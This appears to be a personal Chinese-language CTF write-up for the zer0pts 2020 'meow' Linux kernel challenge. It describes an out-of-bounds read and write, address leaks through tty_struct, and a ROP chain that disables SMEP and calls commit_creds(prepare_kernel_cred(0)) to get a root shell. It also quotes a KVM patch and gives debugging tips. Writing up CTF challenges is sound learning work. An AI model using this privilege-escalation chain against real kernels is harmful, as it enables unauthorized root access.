# zeropts2020 meow
## IDA分析

存在一个越界读写，越界范围为0x400，因此可以通过tty_struct结果体进行信息泄漏和权限提升。

## 利用

- 信息泄漏

通过tty_struct→operations来计算内核基地址；

通过tty_struct→[0x4a*8]泄漏堆地址

- 利用

```c
tty_struct->ops = heapbase
heapbase.write = push_rax_pop_rsp //rax此时指向ops；rdi指向tty_struct
heapbase[0] = pop_rsp
heapbase[1] = heapbase[8]
size_t * rop = &fakeops[8];
   *rop++ = pop_rdx;
   *rop++ = 0x6f0;
   *rop++ = mov_cr4_rdx;
   *rop++ = pop_rdi;
   *rop++ = 0;
   *rop++ = prepare_kernel_cred;
   *rop++ = pop_rcx;
   *rop++ = 0;
   *rop++ = mov_rax_rdi;//mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
   *rop++ = commit_creds;

   *rop++ = 0xffffffff812009c4;//swapgs_restore_regs_and_return_to_usermode+0x16

   *rop++ = 0;
   *rop++ = 0;
   *rop++ = (size_t)getShell;
   *rop++ = user_cs;
   *rop++ = user_flags;
   *rop++ = user_sp;
   *rop++ = user_ss;
```

## 问题

ubuntu18的kvm存在bug，去掉`—enable-kvm`可解决

- kvm

    ```c
    [https://lore.kernel.org/lkml/lsq.1556377989.43658463@decadent.org.uk/t/](https://lore.kernel.org/lkml/lsq.1556377989.43658463@decadent.org.uk/t/)

    ```
    *[PATCH 3.16 067/202] KVM: x86: Fix single-step debugging
      2019-04-27 15:13[PATCH 3.16 000/202] 3.16.66-rc1 review Ben Hutchings
                       `(116 preceding siblings ...)
      2019-04-27 15:13 `[PATCH 3.16 184/202] ipc/shm: Fix pid freeing Ben Hutchings
    @ 2019-04-27 15:13 ` Ben Hutchings
      2019-04-27 15:13 `[PATCH 3.16 144/202] alpha: fix page fault handling for r16-r18 targets Ben Hutchings
                       `(84 subsequent siblings)202 siblings, 0 replies; 205+ messages in thread
    From: Ben Hutchings @ 2019-04-27 15:13 UTC (permalink /raw)
      To: linux-kernel, stable;+Cc: akpm, Denis Kirjanov, Paolo Bonzini, Alexander Popov

    3.16.66-rc1 review patch.  If anyone has any objections, please let me know.

    ------------------

    From: Alexander Popov <alex.popov@linux.com>

    commit 5cc244a20b86090c087073c124284381cdf47234 upstream.

    The single-step debugging of KVM guests on x86 is broken: if we run
    gdb 'stepi' command at the breakpoint when the guest interrupts are
    enabled, RIP always jumps to native_apic_mem_write(). Then other
    nasty effects follow.

    Long investigation showed that on Jun 7, 2017 the
    commit c8401dda2f0a00cd25c0 ("KVM: x86: fix singlestepping over syscall")
    introduced the kvm_run.debug corruption: kvm_vcpu_do_singlestep() can
    be called without X86_EFLAGS_TF set.

    Let's fix it. Please consider that for -stable.

    Signed-off-by: Alexander Popov <alex.popov@linux.com>
    Fixes: c8401dda2f0a00cd25c0 ("KVM: x86: fix singlestepping over syscall")
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>
    Signed-off-by: Ben Hutchings <ben@decadent.org.uk>
    ---
    arch/x86/kvm/x86.c | 3 +--
     1 file changed, 1 insertion(+), 2 deletions(-)

    --- a/arch/x86/kvm/x86.c
    +++ b/arch/x86/kvm/x86.c
    @@ -5400,8 +5400,7 @@ restart:
     		kvm_make_request(KVM_REQ_EVENT, vcpu);
     		vcpu->arch.emulate_regs_need_sync_to_vcpu = false;
     		kvm_rip_write(vcpu, ctxt->eip);
    -		if (r == EMULATE_DONE &&
    -		    (ctxt->tf || (vcpu->guest_debug & KVM_GUESTDBG_SINGLESTEP)))
    +		if (r == EMULATE_DONE && ctxt->tf)
     			kvm_vcpu_do_singlestep(vcpu, &r);
     		kvm_set_rflags(vcpu, ctxt->eflags);
     	} else
    ```
    ```

在`push`的指令用`si`代替`ni`，否则`ni`类似于`c`的效果

- [ ]  其他利用方法
- [ ]  将tty_struct整理为lib

## 收获

tty_struct[0x4a]能够泄漏堆地址
